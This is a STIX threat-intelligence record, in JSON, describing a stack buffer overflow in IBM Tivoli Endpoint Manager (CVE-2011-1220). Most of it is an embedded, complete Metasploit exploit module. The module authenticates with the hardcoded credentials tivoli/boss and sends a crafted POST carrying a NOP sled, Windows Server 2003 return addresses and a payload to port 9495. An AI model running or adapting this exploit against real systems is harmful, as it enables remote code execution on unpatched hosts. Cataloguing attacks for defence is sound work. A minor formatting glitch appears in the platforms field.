{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f0192b2-87ea-46f3-9faa-66f65d9ef9f3",
    "created": "2024-08-14T16:54:31.944722Z",
    "modified": "2024-08-14T16:54:31.944727Z",
    "name": "IBM Tivoli Endpoint Manager POST Query Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in the way IBM Tivoli Endpoint Manager versions 3.7.1, 4.1, 4.1.1, 4.3.1 handles long POST query arguments.  This issue can be triggered by sending a specially crafted HTTP POST request to the service (lcfd.exe) listening on TCP port 9495. To trigger this issue authorization is required. This exploit makes use of a second vulnerability, a hardcoded account (tivoli/boss) is used to bypass the authorization restriction. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ibm_tivoli_endpoint_bof.rb",
            "external_id": "ibm_tivoli_endpoint_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1220"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Tivoli Endpoint Manager POST Query Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in the way IBM Tivoli\n        Endpoint Manager versions 3.7.1, 4.1, 4.1.1, 4.3.1 handles long POST query\n        arguments.\n\n        This issue can be triggered by sending a specially crafted HTTP POST request to\n      the service (lcfd.exe) listening on TCP port 9495. To trigger this issue authorization\n      is required. This exploit makes use of a second vulnerability, a hardcoded account\n      (tivoli/boss) is used to bypass the authorization restriction.\n      },\n      'Author'         =>\n        [\n          'bannedit', # metasploit module\n          'Jeremy Brown <0xjbrown[at]gmail.com>', # original public exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-1220'],\n          [ 'OSVDB', '72713'], # buffer overflow\n          [ 'OSVDB', '72751'], # hardcoded account\n          [ 'BID', '48049'],\n          [ 'ZDI', '11-169' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\\x0d\\x0a\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows Server 2003 SP0', { 'Ret' => 0x77d80787 }], # user32.dll - jmp esp\n          ['Windows Server 2003 SP1', { 'Ret' => 0x77403680 }], # user32.dll - jmp esp\n          ['Windows Server 2003 SP2', { 'Ret' => 0x77402680 }], # user32.dll - jmp esp\n        ],\n      'DisclosureDate' => '2011-05-31'))\n\n    register_options(\n      [\n        Opt::RPORT(9495),\n      ])\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}...\")\n\n    auth = Rex::Text.encode_base64(\"tivoli:boss\")\n    varname = rand_text_alpha(rand(10))\n\n    sploit = make_nops(1) * 256\n    sploit << [target.ret].pack('V')\n    sploit << payload.encoded\n\n    print_status(\"Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    res = send_request_cgi({\n      'uri'          => '/addr',\n      'method'       => 'POST',\n      'headers'      =>\n      {\n        'Authorization' => \"Basic #{auth}\"\n      },\n      'vars_post'    =>\n      {\n        varname => sploit,\n      },\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-31",
    "x_mitre_platforms": [
        "win'"
    ]
}